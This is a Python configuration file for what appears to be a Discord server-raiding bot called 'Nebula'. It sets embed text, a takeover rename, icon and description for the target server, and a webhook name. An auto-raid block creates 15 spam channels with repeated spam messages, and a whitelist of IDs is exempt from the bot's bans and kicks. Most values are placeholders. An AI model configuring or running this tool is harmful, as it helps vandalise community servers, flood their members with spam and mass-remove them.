EMBED_CONFIG = {
    "title": "NEbula",    # Maine Embed Title here 
    "description": "test",   # Main Embed Description here 
    "color": 0xFF5733,   # Change embed color if you want (red)
    "fields": [
        {"name": "test", "value": "test", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
        {"name": "test", "value": "test", "inline": False},
        {"name": "test","value": "test", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False
    ],
    "image": "https://cdn.discordapp.com/attachments/1198721632294948916/1199070304002121898/image.png?ex=65c1343e&is=65aebf3e&hm=8574e4154b42f80001bb9ce7ef8bfab9437d38ff0baa9a503572b06a8116240f&",   # Embed Icon url here → https://image.jpg
    "footer": "Nyxoy",  # Embed Footer here 
}

SERVER_CONFIG = {
    "new_name": "",  # New Server Name here 
    "new_icon": "",   # New Server Icon url here → https://image.jpg 
    "new_description": "",  # New Server Description here 
}

WEBHOOK_CONFIG = {
    "default_name": "Nebula",  # Webhook Name here 
}


AUTO_RAID_CONFIG = {
    'num_channels': 15,  # Number of channels
    'channel_type': 'text',  # text/voice
    'channel_name': '',  # Channel name
    'num_messages': 5,  # Number of message to spam
    'message_content': '' # Spam Message
}

NO_BAN_KICK_ID = {
    000000000000,       # Put Whitelist ID
    111111111111,       # No Ban & No Kick
    222222222222,
}